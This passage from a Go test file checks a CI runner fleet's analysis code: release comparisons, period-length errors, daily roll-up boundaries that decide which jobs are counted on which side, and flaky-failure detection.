	f.release("v1.3.2", at(60), 3)
	f.release("v1.3.3", at(120), 3)
	req := func(a, b string) CompareRequest {
		return CompareRequest{A: a, B: b, Since: analysisPeriod.Since, Until: analysisPeriod.Until}
	}
	got, err := f.c.AnalyseCompare(f.ctx, req("", "v1.3.2"))
	if err != nil || got.Evidence.A.Label != "v1.3.1" || got.Evidence.B.Label != "v1.3.2" {
		t.Errorf("b v1.3.2: A %q, B %q, %v; want v1.3.1 then v1.3.2", got.Evidence.A.Label, got.Evidence.B.Label, err)
	}
	if _, err := f.c.AnalyseCompare(f.ctx, req("", "v1.3.1")); !errors.Is(err, ErrTooFewReleases) {
		t.Errorf("b the oldest release: %v, want ErrTooFewReleases", err)
	}
	if _, err := f.c.AnalyseCompare(f.ctx, req("v1.3.2", "v1.3.2")); !errors.Is(err, ErrSameRelease) {
		t.Errorf("a and b the same: %v, want ErrSameRelease", err)
	}
}

// The routes refuse a long period first; anyone else is told in the units
// the setting is written in, not as a Go duration.
func TestAPeriodTooLongIsRefusedInDaysAndHours(t *testing.T) {
	f := newAnalysisFleet(t)
	_, err := f.c.AnalyseQueueWait(f.ctx, AnalysisWindow{Since: analysisNow.Add(-(91*24 + 3) * time.Hour), Until: analysisNow}, "")
	if err == nil || !strings.Contains(err.Error(), "91 days and 3 hours") || !strings.Contains(err.Error(), "at most 90 days") ||
		!strings.Contains(err.Error(), "limits.job_stats_window") || strings.Contains(err.Error(), "0s") {
		t.Errorf("error %v, want the period and the limit in days and hours", err)
	}
	// Twenty minutes over is over, and never reads as the limit itself.
	_, err = f.c.AnalyseQueueWait(f.ctx, AnalysisWindow{Since: analysisNow.Add(-90*24*time.Hour - 20*time.Minute), Until: analysisNow}, "")
	if err == nil || !strings.Contains(err.Error(), "is 90 days and 1 hour, and an analysis covers at most 90 days") {
		t.Errorf("twenty minutes over: %v", err)
	}
	if _, err := f.c.AnalyseQueueWait(f.ctx, AnalysisWindow{Since: analysisNow, Until: analysisNow}, ""); err == nil {
		t.Error("a period with no length was accepted")
	}
}

// countsFleet is a fleet whose jobs each ran on one of its runners at the
// given instants, rolled up to the midnight before rolledTo when it is set,
// as the background loop does each day.
func countsFleet(t *testing.T, retention time.Duration, rolledTo time.Time, jobs ...time.Time) *analysisFleet {
	t.Helper()
	f := newAnalysisFleet(t)
	f.c.UpdateConfig(func(c *config.Config) { c.Retention.Jobs = retention })
	for i, q := range jobs {
		f.job("", q, func(j *store.Job) {
			ran(q.Add(time.Minute), q.Add(5*time.Minute), "success")(j)
			j.RunnerID = fmt.Sprintf("run_%d", i)
		})
	}
	if !rolledTo.IsZero() {
		if _, err := f.st.RollUpInstallations(f.ctx, rolledTo, time.Time{}); err != nil {
			t.Fatal(err)
		}
	}
	return f
}

func dayAt(d, h int) time.Time {
	return analysisNow.Truncate(24*time.Hour).AddDate(0, 0, d).Add(time.Duration(h) * time.Hour)
}

// The later side, read from the roll-up's rows, begins at its own first
// midnight; the earlier side ends there, so no hour is in both counts. The
// re-review's probe: the roll-up has not reached the later side's first day,
// whose jobs at 03:00 were counted on both sides.
func TestTheEarlierSideEndsWhereTheLaterSidesCountsBegin(t *testing.T) {
	jobs := []time.Time{dayAt(-4, 5), dayAt(-3, 10), dayAt(-3, 11), dayAt(-3, 12)}
	for range 4 {
		jobs = append(jobs, dayAt(-2, 3))
	}
	jobs = append(jobs, dayAt(-2, 20), dayAt(-2, 21))
	f := countsFleet(t, 48*time.Hour, dayAt(-2, 0), jobs...)
	got, err := f.c.AnalyseCompare(f.ctx, CompareRequest{By: "period", Since: dayAt(-2, 6), Until: dayAt(-1, 6)})
	if err != nil {
		t.Fatal(err)
	}
	a, b := got.Evidence.A, got.Evidence.B
	if !a.Until.Equal(b.Since) || !b.Since.Equal(dayAt(-2, 0)) || a.Figures.Jobs != 3 || b.Figures.Jobs != 6 {
		t.Errorf("A %v to %v with %d jobs, B %v to %v with %d; want A to end where B begins, at %v, with 3 and 6",
			a.Since, a.Until, a.Figures.Jobs, b.Since, b.Until, b.Figures.Jobs, dayAt(-2, 0))
	}
	if a.Label != "the 24 hours before" || b.Label != "the 30 hours to 2026-10-11 06:00 UTC" {
		t.Errorf("labels %q and %q", a.Label, b.Label)
	}
}

// A later side past retention.jobs that ends partway through a day the
// roll-up has absorbed ends at that day's midnight, and the jobs after it are
// on neither side. Its label alone does not say so, because labels name the
// span read whenever it differs from the one asked for, so each side carries
// the end asked for and a sentence names the hours left out. The re-review's
// probe: five jobs at 03:00 the next morning, more than the side's own count.
func TestALaterSideEndingPartwayThroughARolledDaySaysTheHoursAfterItAreOnNeitherSide(t *testing.T) {
	jobs := []time.Time{dayAt(-4, 5), dayAt(-3, 10), dayAt(-2, 8), dayAt(-2, 9), dayAt(-2, 10), dayAt(-2, 11)}
	for range 5 {
		jobs = append(jobs, dayAt(-1, 3))
	}
	f := countsFleet(t, 48*time.Hour, analysisNow, jobs...)
	got, err := f.c.AnalyseCompare(f.ctx, CompareRequest{By: "period", Since: dayAt(-2, 6), Until: dayAt(-1, 6)})
	if err != nil {
		t.Fatal(err)
	}
	a, b := got.Evidence.A, got.Evidence.B
	if !b.Until.Equal(dayAt(-1, 0)) || !b.AskedUntil.Equal(dayAt(-1, 6)) || b.Figures.Jobs != 4 {
		t.Errorf("B ends at %v, asked to end at %v, with %d jobs; want the 4 jobs to %v, asked to %v", b.Until, b.AskedUntil, b.Figures.Jobs, dayAt(-1, 0), dayAt(-1, 6))
	}
	if !a.AskedUntil.Equal(dayAt(-2, 6)) {
		t.Errorf("A asked to end at %v, want %v", a.AskedUntil, dayAt(-2, 6))
	}
	raw, err := json.Marshal(got.Evidence.B)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(raw), `"asked_until":"2026-10-11T06:00:00Z"`) {
		t.Errorf("B's evidence %s does not carry the end asked for", raw)
	}
	for _, want := range []string{
		"the roll-up keeps whole UTC days, so the 24 hours to 2026-10-11 00:00 UTC ends earlier than the period asked for, " +
			"and the jobs queued from 2026-10-11 00:00 UTC to 2026-10-11 06:00 UTC, after its last whole day, are counted on neither side",
		// The earlier side's asked hours on the later side's first day are
		// the later side's, and that is said too.
		"the roll-up keeps whole UTC days, so the 24 hours to 2026-10-11 00:00 UTC begins earlier than the period asked for, " +
			"and the jobs queued from 2026-10-10 00:00 UTC to 2026-10-10 06:00 UTC are counted in it, not in the 24 hours before",
	} {
		if !strings.Contains(got.ConfidenceReason, want) {
			t.Errorf("reason %q does not say %q", got.ConfidenceReason, want)
		}
	}
}

// When the fleet's first record falls inside the later side's first day,
// before the period asked for begins, the later side's counts begin at that
// record, and the earlier side's last hours are counted in it. The earlier
// side could not be read, and its sentence names where the counts begin, not
// the midnight its read was cut back to, and says where its last hours went.
// The re-review's probe: the first record at 02:00, the later side from
// 06:00, with the roll-up run and without it.
func TestAnEarlierSideUnreadBecauseTheFleetBeganOnTheLaterSidesFirstDaySaysWhereItsLastHoursWent(t *testing.T) {
	jobs := []time.Time{dayAt(-2, 2), dayAt(-2, 2), dayAt(-2, 8), dayAt(-2, 8), dayAt(-2, 8), dayAt(-2, 20), dayAt(-2, 20)}
	for name, c := range map[string]struct {
		rolledTo time.Time
		b        string
	}{
		"rolled up":     {analysisNow, "the 22 hours to 2026-10-11 00:00 UTC"},
		"not rolled up": {time.Time{}, "the 28 hours to 2026-10-11 06:00 UTC"},
	} {
		f := countsFleet(t, 48*time.Hour, c.rolledTo, jobs...)
		got, err := f.c.AnalyseCompare(f.ctx, CompareRequest{By: "period", Since: dayAt(-2, 6), Until: dayAt(-1, 6)})
		if err != nil {
			t.Fatal(err)
		}
		if b := got.Evidence.B; b.Label != c.b || !b.Since.Equal(dayAt(-2, 2)) || b.Figures.Jobs != 7 {
			t.Errorf("%s: B = %q from %v with %d jobs; want %q from %v with 7", name, b.Label, b.Since, b.Figures.Jobs, c.b, dayAt(-2, 2))
		}
		want := "The fleet keeps no counts from before 2026-10-10 02:00 UTC, so the 24 hours before could not be read, and there is nothing to compare " + c.b +
			" with; the roll-up keeps whole UTC days, so the jobs queued from 2026-10-10 02:00 UTC to 2026-10-10 06:00 UTC, the earlier period's last hours, are counted in " + c.b + "."
		if got.Summary != want {
			t.Errorf("%s: summary\n got %q\nwant %q", name, got.Summary, want)
		}
		if a := got.Evidence.A; a.NoRecordBefore == nil || !a.NoRecordBefore.Equal(dayAt(-2, 2)) {
			t.Errorf("%s: A's no-record instant is %v, want %v", name, a.NoRecordBefore, dayAt(-2, 2))
		}
	}
}

// Before the fleet's first record there is nothing to count. A side wholly
// before it could not be read, which is not the same as no jobs having run;
// a side partly before it begins at the record and says so.
func TestASideBeforeTheFleetsFirstRecordSaysSoRatherThanNoJobsRan(t *testing.T) {
	f := countsFleet(t, 48*time.Hour, time.Time{}, dayAt(-2, 16), dayAt(-2, 20))
	got, err := f.c.AnalyseCompare(f.ctx, CompareRequest{By: "period", Since: dayAt(-2, 6), Until: dayAt(-1, 6)})
	if err != nil {
		t.Fatal(err)
	}
	if want := "The fleet keeps no counts from before 2026-10-10 16:00 UTC, so the 24 hours before could not be read, and there is nothing to compare the 14 hours to 2026-10-11 06:00 UTC with."; got.Summary != want {
		t.Errorf("wholly before: summary\n got %q\nwant %q", got.Summary, want)
	}
	if b := got.Evidence.B; b.Figures.Jobs != 2 || b.NoRecordBefore == nil || !b.NoRecordBefore.Equal(dayAt(-2, 16)) {
		t.Errorf("wholly before: B = %+v", b)
	}

	f = countsFleet(t, 48*time.Hour, time.Time{}, dayAt(-3, 12), dayAt(-2, 5), dayAt(-2, 6), dayAt(-1, 1), dayAt(-1, 2), dayAt(-1, 3))
	got, err = f.c.AnalyseCompare(f.ctx, CompareRequest{By: "period", Since: dayAt(-2, 18), Until: analysisNow})
	if err != nil {
		t.Fatal(err)
	}
	a := got.Evidence.A
	if !a.CountsOnly || a.Figures.Jobs != 3 || !a.Since.Equal(dayAt(-3, 12)) || a.Label != "the 30 hours before" {
		t.Errorf("partly before: A = %q, counts only %v from %v, %d jobs; want the 30 hours before from %v with 3", a.Label, a.CountsOnly, a.Since, a.Figures.Jobs, dayAt(-3, 12))
	}
	if want := "the fleet keeps no counts from before 2026-10-09 12:00 UTC, so the 30 hours before begins there, later than the period asked for"; !strings.Contains(got.ConfidenceReason, want) {
		t.Errorf("partly before: reason %q does not say %q", got.ConfidenceReason, want)
	}
}

// Every boundary of the counts-only path, each checked for the same three
// things: no hour is in both counts, every job is counted where its side's
// dates say, and whatever falls between the sides is named with its cause.
func TestEveryCountsOnlyBoundaryCountsEachJobOnceAndNamesWhatItLeavesOut(t *testing.T) {
	for _, c := range []struct {
		name         string
		retention    time.Duration
		rolledTo     time.Time
		jobs         []time.Time
		since, until time.Time
		aJobs, bJobs int
		says, never  string
	}{
		{name: "later side within retention, earlier side's end day rolled up", retention: 48 * time.Hour, rolledTo: dayAt(-1, 0),
			jobs: []time.Time{dayAt(-5, 5), dayAt(-3, 20), dayAt(-2, 5), dayAt(-2, 16)}, since: dayAt(-2, 15), until: analysisNow,
			aJobs: 1, bJobs: 1, says: "the roll-up keeps whole UTC days, so the jobs queued from 2026-10-10 00:00 UTC to 2026-10-10 15:00 UTC"},
		{name: "later side within retention, earlier side's end day not rolled up", retention: 48 * time.Hour,
			jobs: []time.Time{dayAt(-5, 5), dayAt(-3, 20), dayAt(-2, 5), dayAt(-2, 16)}, since: dayAt(-2, 15), until: analysisNow,
			aJobs: 2, bJobs: 1, never: "neither side"},
		{name: "later side past retention, its first day not rolled up", retention: 48 * time.Hour, rolledTo: dayAt(-2, 0),
			jobs: []time.Time{dayAt(-4, 5), dayAt(-3, 10), dayAt(-2, 3), dayAt(-2, 20)}, since: dayAt(-2, 6), until: dayAt(-1, 6),
			aJobs: 1, bJobs: 2, never: "neither side"},
		{name: "later side past retention, its first day rolled up", retention: 48 * time.Hour, rolledTo: dayAt(-1, 0),
			jobs: []time.Time{dayAt(-4, 5), dayAt(-3, 10), dayAt(-2, 3), dayAt(-1, 3)}, since: dayAt(-2, 6), until: dayAt(-1, 6),
			aJobs: 1, bJobs: 2, never: "neither side"},
		{name: "sides meeting on a midnight leave no hours out", retention: 48 * time.Hour, rolledTo: analysisNow,
			jobs: []time.Time{dayAt(-4, 5), dayAt(-2, 23), dayAt(-1, 1)}, since: dayAt(-1, 0), until: analysisNow,
			aJobs: 1, bJobs: 1, never: "neither side"},
		{name: "both sides past retention, the later one ending off a rolled midnight", retention: 48 * time.Hour, rolledTo: analysisNow,
			jobs: []time.Time{dayAt(-5, 5), dayAt(-4, 5), dayAt(-3, 5), dayAt(-2, 5)}, since: dayAt(-3, 12), until: dayAt(-2, 12),
			aJobs: 1, bJobs: 1, says: "the jobs queued from 2026-10-10 00:00 UTC to 2026-10-10 12:00 UTC, after its last whole day, are counted on neither side"},
		{name: "the later side past retention, ending off a rolled midnight with its tail busier than itself", retention: 48 * time.Hour, rolledTo: analysisNow,
			jobs:  []time.Time{dayAt(-4, 5), dayAt(-3, 10), dayAt(-2, 8), dayAt(-2, 9), dayAt(-1, 3), dayAt(-1, 3), dayAt(-1, 3)},
			since: dayAt(-2, 6), until: dayAt(-1, 6),
			aJobs: 1, bJobs: 2, says: "the jobs queued from 2026-10-11 00:00 UTC to 2026-10-11 06:00 UTC, after its last whole day, are counted on neither side"},
		{name: "the first record inside the later side's first day, before it begins, rolled up", retention: 48 * time.Hour, rolledTo: analysisNow,
			jobs: []time.Time{dayAt(-2, 2), dayAt(-2, 2), dayAt(-2, 8)}, since: dayAt(-2, 6), until: dayAt(-1, 6),
			aJobs: 0, bJobs: 3, says: "keeps no counts from before 2026-10-10 02:00 UTC"},
		{name: "the first record inside the later side's first day, before it begins, not rolled up", retention: 48 * time.Hour,
			jobs: []time.Time{dayAt(-2, 2), dayAt(-2, 2), dayAt(-2, 8)}, since: dayAt(-2, 6), until: dayAt(-1, 6),
			aJobs: 0, bJobs: 3, says: "the jobs queued from 2026-10-10 02:00 UTC to 2026-10-10 06:00 UTC, the earlier period's last hours, are counted in"},
		{name: "the first record inside the later side's last rolled day, after the midnight it ends at", retention: 48 * time.Hour, rolledTo: analysisNow,
			jobs: []time.Time{dayAt(-1, 2), dayAt(-1, 2), dayAt(-1, 4)}, since: dayAt(-2, 6), until: dayAt(-1, 6),
			aJobs: 0, bJobs: 0, says: "The fleet keeps no counts from before 2026-10-11 02:00 UTC, so neither the 24 hours before nor the 24 hours to 2026-10-11 06:00 UTC could be read, " +
				"and there is nothing to compare; the roll-up keeps whole UTC days, so the jobs queued from 2026-10-11 02:00 UTC to 2026-10-11 06:00 UTC, the later period's last hours, are counted on neither side."},
		{name: "the first record inside the earlier side's last rolled day, the later side within retention", retention: 48 * time.Hour, rolledTo: analysisNow,
			jobs: []time.Time{dayAt(-2, 5), dayAt(-2, 10), dayAt(-2, 16), dayAt(-1, 3)}, since: dayAt(-2, 15), until: analysisNow,
			aJobs: 0, bJobs: 2, says: "the jobs queued from 2026-10-10 05:00 UTC to 2026-10-10 15:00 UTC, the earlier period's last hours, are counted on neither side"},
		{name: "the earlier side partly before the first record", retention: 48 * time.Hour,
			jobs: []time.Time{dayAt(-3, 12), dayAt(-2, 5), dayAt(-1, 1)}, since: dayAt(-2, 18), until: analysisNow,
			aJobs: 2, bJobs: 1, says: "the fleet keeps no counts from before 2026-10-09 12:00 UTC"},
		{name: "the earlier side wholly before the first record, the later partly", retention: 48 * time.Hour,
			jobs: []time.Time{dayAt(-2, 16), dayAt(-2, 20)}, since: dayAt(-2, 6), until: dayAt(-1, 6),
			aJobs: 0, bJobs: 2, says: "could not be read"},
	} {
		t.Run(c.name, func(t *testing.T) {
			f := countsFleet(t, c.retention, c.rolledTo, c.jobs...)
			got, err := f.c.AnalyseCompare(f.ctx, CompareRequest{By: "period", Since: c.since, Until: c.until})
			if err != nil {
				t.Fatal(err)
			}
			a, b := got.Evidence.A, got.Evidence.B
			if b.Since.Before(a.Until) {
				t.Errorf("A ends at %v, after B begins at %v: the hours between are counted twice", a.Until, b.Since)
			}
			in := func(since, until time.Time) int {
				n := 0
				for _, q := range c.jobs {
					if !q.Before(since) && q.Before(until) {
						n++
					}
				}
				return n
			}
			if a.Figures.Jobs != c.aJobs || in(a.Since, a.Until) != c.aJobs || b.Figures.Jobs != c.bJobs || in(b.Since, b.Until) != c.bJobs {
				t.Errorf("A %v to %v counts %d (its dates hold %d), B %v to %v counts %d (%d); want %d and %d",
					a.Since, a.Until, a.Figures.Jobs, in(a.Since, a.Until), b.Since, b.Until, b.Figures.Jobs, in(b.Since, b.Until), c.aJobs, c.bJobs)
			}
			said := got.Summary + " " + got.ConfidenceReason
			if c.says != "" && !strings.Contains(said, c.says) {
				t.Errorf("finding %q does not say %q", said, c.says)
			}
			if c.never != "" && strings.Contains(said, c.never) {
				t.Errorf("finding %q says %q", said, c.never)
			}
			if a.Figures.Jobs == 0 && strings.Contains(said, "No jobs ran") {
				t.Errorf("a side that could not be read is said to have run nothing: %q", said)
			}
			// A side that ends before the end asked for has hours that are
			// on the other side or on neither, and the finding says which,
			// up to that end.
			for _, side := range []analysis.CompareSide{a, b} {
				if side.Until.Before(side.AskedUntil) && !strings.Contains(said, side.AskedUntil.Format("2006-01-02 15:04 UTC")) {
					t.Errorf("%s ends at %v, before the %v asked for, and the finding %q does not say what became of the hours between",
						side.Label, side.Until, side.AskedUntil, said)
				}
			}
			// The instant a side is said to have no counts before is where
			// the fleet's counts begin, never a midnight its read was cut
			// back to.
			first := slices.MinFunc(c.jobs, func(x, y time.Time) int { return x.Compare(y) })
			for _, side := range []analysis.CompareSide{a, b} {
				if side.NoRecordBefore != nil && side.NoRecordBefore.Before(first) {
					t.Errorf("%s is said to have no counts before %v, but the first record is at %v", side.Label, side.NoRecordBefore, first)
				}
			}
		})
	}
}

// A later side read from the roll-up's rows begins at its first midnight, so
// an earlier side wholly inside that day would be counted in the later one:
// what is left of it is nothing, and it is refused rather than said to have
// run no jobs.
func TestAnEarlierSideWhollyInsideTheLaterSidesFirstDayIsRefused(t *testing.T) {
	f := countsFleet(t, 24*time.Hour, dayAt(-1, 0), dayAt(-3, 5), dayAt(-1, 3), dayAt(-1, 8))
	_, err := f.c.AnalyseCompare(f.ctx, CompareRequest{By: "period", Since: dayAt(-1, 6), Until: dayAt(-1, 12)})
	if !errors.Is(err, ErrWholeDaysOnly) || !strings.Contains(err.Error(), "the earlier period, 2026-10-11 00:00 UTC to 2026-10-11 06:00 UTC") {
		t.Errorf("%v, want the earlier period refused", err)
	}
}

// The snapshot names the step a failed job stopped at from the steps GitHub
// reported, and carries the rerun's attempt so a pass on the same commit can
// separate a flaky job from a broken one.
func TestAnalyseRecurringFailuresReadsTheFailedStepAndTheRerun(t *testing.T) {
	f := newAnalysisFleet(t)
	pool := f.pool("linux", nil)
	for i := range 3 {
		sha := fmt.Sprintf("sha%d", i)
		f.job(pool.ID, at(i*20), func(j *store.Job) {
			ran(at(i*20+1), at(i*20+5), "failure")(j)
			j.HeadSHA, j.HeadBranch, j.RunAttempt = sha, "main", 1
			j.Steps = store.JobSteps{{Number: 1, Name: "Set up", Conclusion: "success"}, {Number: 2, Name: "Run tests", Conclusion: "failure"}}
		})
		f.job(pool.ID, at(i*20+6), func(j *store.Job) {
			ran(at(i*20+7), at(i*20+9), "success")(j)
			j.HeadSHA, j.HeadBranch, j.RunAttempt = sha, "main", 2
		})
	}
	got, err := f.c.AnalyseRecurringFailures(f.ctx, analysisPeriod)
	if err != nil {
		t.Fatal(err)
	}
	if len(got.Evidence.Groups) != 1 {
		t.Fatalf("finding = %+v", got)
	}
	g := got.Evidence.Groups[0]
	if g.Class != analysis.ClassFlaky || g.FailedStep != "Run tests" || g.RetryPasses != 3 || g.Failures != 3 || g.Runs != 6 {
		t.Errorf("group = %+v", g)
	}
}
